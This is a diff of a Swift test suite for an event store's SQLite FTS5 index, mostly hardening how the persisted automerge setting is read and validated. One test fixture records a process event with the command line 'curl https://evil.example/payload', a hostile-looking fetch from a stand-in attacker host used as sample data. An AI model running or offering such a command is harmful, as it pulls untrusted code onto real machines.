@@ -91,20 +91,54 @@ struct EventStoreFTSMergeTests {
         )
     }
 
-    /// Read the persisted FTS5 `automerge` config value from the
-    /// `events_fts_config` shadow table. Returns nil if unset/absent.
-    private static func readAutomergeConfig(at path: String) -> Int? {
+    private enum AutomergeConfig: Equatable {
+        case sqliteDefault
+        case configured(Int)
+
+        var effectiveValue: Int {
+            // The bundled FTS5 initializes nAutomerge to 4 and treats an
+            // explicitly configured 1 as that same default (sqlite3.c:
+            // FTS5_DEFAULT_AUTOMERGE / sqlite3Fts5ConfigSetValue).
+            switch self {
+            case .sqliteDefault, .configured(1): return 4
+            case .configured(let value): return value
+            }
+        }
+    }
+
+    private enum AutomergeReadError: Error, Equatable {
+        case open, prepare, step, invalidValue
+    }
+
+    /// A successful query with no row means SQLite's default, not failure.
+    /// Missing files/tables, unsuccessful stepping and invalid persisted values
+    /// must never masquerade as an enabled automerge configuration.
+    private static func readAutomergeConfig(at path: String) throws -> AutomergeConfig {
         var db: OpaquePointer?
         defer { if let d = db { sqlite3_close(d) } }
         guard sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, nil) == SQLITE_OK,
-              let db else { return nil }
+              let db else { throw AutomergeReadError.open }
         var stmt: OpaquePointer?
         defer { sqlite3_finalize(stmt) }
         guard sqlite3_prepare_v2(db, "SELECT v FROM events_fts_config WHERE k = 'automerge'", -1, &stmt, nil) == SQLITE_OK,
-              sqlite3_step(stmt) == SQLITE_ROW else {
-            return nil
+              let stmt else { throw AutomergeReadError.prepare }
+        switch sqlite3_step(stmt) {
+        case SQLITE_DONE: return .sqliteDefault
+        case SQLITE_ROW: break
+        default: throw AutomergeReadError.step
         }
-        return Int(sqlite3_column_int64(stmt, 0))
+        guard let value = sqlite3_column_value(stmt, 0),
+              sqlite3_value_numeric_type(value) == SQLITE_INTEGER else {
+            throw AutomergeReadError.invalidValue
+        }
+        let configured = sqlite3_value_int64(value)
+        guard (0...64).contains(configured) else {
+            throw AutomergeReadError.invalidValue
+        }
+        guard sqlite3_step(stmt) == SQLITE_DONE else {
+            throw AutomergeReadError.step
+        }
+        return .configured(Int(configured))
     }
 
     /// Count the blocks backing the events_fts index (rows in the internal
@@ -149,10 +183,82 @@ struct EventStoreFTSMergeTests {
             name: "curl", path: "/usr/bin/curl",
             commandLine: "curl https://evil.example/payload"
         ))
+        let configuration = try Self.readAutomergeConfig(at: path)
         #expect(
-            Self.readAutomergeConfig(at: path) != 0,
+            configuration.effectiveValue > 0,
             "automerge is disabled again; segment growth is unbounded during writes"
         )
+    }
+
+    @Test("automerge inspection distinguishes the FTS default from explicit settings")
+    func automergeConfigDefaultAndExplicitValues() throws {
+        let path = Self.tempPath()
+        defer { try? FileManager.default.removeItem(atPath: path) }
+        var connection: OpaquePointer?
+        defer { if let connection { sqlite3_close(connection) } }
+        try #require(sqlite3_open_v2(
+            path, &connection, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil
+        ) == SQLITE_OK)
+        let db = try #require(connection)
+        try #require(sqlite3_exec(
+            db, "CREATE VIRTUAL TABLE events_fts USING fts5(value)", nil, nil, nil
+        ) == SQLITE_OK)
+        let initial = try Self.readAutomergeConfig(at: path)
+        #expect(initial == .sqliteDefault)
+        #expect(initial.effectiveValue == 4)
+        for value in [0, 1, 4, 8] {
+            try #require(sqlite3_exec(
+                db, "INSERT INTO events_fts(events_fts, rank) VALUES('automerge', \(value))",
+                nil, nil, nil
+            ) == SQLITE_OK)
+            let configured = try Self.readAutomergeConfig(at: path)
+            #expect(configured == .configured(value))
+            #expect(configured.effectiveValue == (value == 1 ? 4 : value))
+        }
+    }
+
+    @Test("automerge read failures and malformed values cannot pass as defaults")
+    func automergeConfigReadFailuresAreNotDefaults() throws {
+        let path = Self.tempPath()
+        defer { try? FileManager.default.removeItem(atPath: path) }
+        #expect(throws: AutomergeReadError.open) {
+            try Self.readAutomergeConfig(at: path)
+        }
+        #expect(!FileManager.default.fileExists(atPath: path))
+        var connection: OpaquePointer?
+        defer { if let connection { sqlite3_close(connection) } }
+        try #require(sqlite3_open_v2(
+            path, &connection, SQLITE_OPEN_READWRITE | SQLITE_OPEN_CREATE, nil
+        ) == SQLITE_OK)
+        let db = try #require(connection)
+        #expect(throws: AutomergeReadError.prepare) {
+            try Self.readAutomergeConfig(at: path)
+        }
+        // A tiny ordinary table tests the reader's error boundary without
+        // corrupting a real FTS index or touching any non-fixture database.
+        try #require(sqlite3_exec(
+            db, "CREATE TABLE events_fts_config(k TEXT PRIMARY KEY, v); "
+                + "INSERT INTO events_fts_config VALUES('automerge', NULL)",
+            nil, nil, nil
+        ) == SQLITE_OK)
+        for literal in ["NULL", "-1", "65", "'not-an-integer'", "2.5"] {
+            try #require(sqlite3_exec(
+                db, "UPDATE events_fts_config SET v = \(literal)", nil, nil, nil
+            ) == SQLITE_OK)
+            #expect(throws: AutomergeReadError.invalidValue) {
+                try Self.readAutomergeConfig(at: path)
+            }
+        }
+        // The view prepares successfully but evaluating abs(Int64.min) fails
+        // at sqlite3_step. An interrupted/error result is not SQLITE_DONE.
+        try #require(sqlite3_exec(
+            db, "DROP TABLE events_fts_config; CREATE VIEW events_fts_config AS "
+                + "SELECT 'automerge' AS k, abs(-9223372036854775808) AS v",
+            nil, nil, nil
+        ) == SQLITE_OK)
+        #expect(throws: AutomergeReadError.step) {
+            try Self.readAutomergeConfig(at: path)
+        }
     }
 
     @Test("search() finds inserted events BEFORE any explicit merge")
@@ -177,17 +283,18 @@ struct EventStoreFTSMergeTests {
         #expect(hits.events.first?.process.name == "curl")
     }
 
+    #if DEBUG
     @Test("smaller cross-block projection winner preserves aggregate coverage")
     func smallerCrossBlockWinnerPreservesCoverage() async throws {
         let path = Self.tempPath()
         defer { try? FileManager.default.removeItem(atPath: path) }
         let store = try EventStore(path: path)
 
-        // Start just after a wall-clock second boundary so both insertion
-        // transactions deterministically share one admission bucket.
-        let now = Date().timeIntervalSince1970
-        let delay = 1.05 - (now - floor(now))
-        try await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000))
+        // Both normal insertion transactions must exercise one bucket even
+        // if the scheduler pauses either call across a wall-clock boundary.
+        // The DEBUG-only per-store seam leaves release admission unchanged.
+        let admissionBucket = Int64(floor(Date().timeIntervalSince1970))
+        await store.setJournalAdmissionBucketForTesting(admissionBucket)
 
         let timestamp = Date(timeIntervalSince1970: 1_700_000_000)
         let priorIDs = [
@@ -228,23 +335,23 @@ struct EventStoreFTSMergeTests {
 
         var db: OpaquePointer?
         defer { if let db { sqlite3_close(db) } }
-        #expect(sqlite3_open_v2(
+        try #require(sqlite3_open_v2(
             path,
             &db,
             SQLITE_OPEN_READONLY,
             nil
         ) == SQLITE_OK)
-        guard let db else { return }
+        let database = try #require(db)
 
         var statement: OpaquePointer?
         defer { sqlite3_finalize(statement) }
-        #expect(sqlite3_prepare_v2(
-            db,
+        try #require(sqlite3_prepare_v2(
+            database,
             """
             SELECT COUNT(DISTINCT b.admission_bucket),
                    c.considered_count, c.materialized_count,
                    c.materialized_bytes, c.omitted_replaced_count,
-                   c.replacement_total
+                   c.replacement_total, COUNT(DISTINCT b.block_id)
             FROM event_journal_blocks b
             JOIN event_projection_coverage c
               ON c.bucket_start = b.admission_bucket
@@ -253,14 +360,17 @@ struct EventStoreFTSMergeTests {
             &statement,
             nil
         ) == SQLITE_OK)
-        #expect(sqlite3_step(statement) == SQLITE_ROW)
+        try #require(sqlite3_step(statement) == SQLITE_ROW)
         #expect(sqlite3_column_int64(statement, 0) == 1)
         #expect(sqlite3_column_int64(statement, 1) == 5)
         #expect(sqlite3_column_int64(statement, 2) == 4)
         #expect(sqlite3_column_int64(statement, 3) > 0)
         #expect(sqlite3_column_int64(statement, 4) == 1)
         #expect(sqlite3_column_int64(statement, 5) == 1)
+        #expect(sqlite3_column_int64(statement, 6) == 2)
+        #expect(sqlite3_step(statement) == SQLITE_DONE)
     }
+    #endif
 
     @Test("mergeFTS() succeeds and search() returns identical results after merge")
     func mergeSucceedsAndSearchUnchanged() async throws {
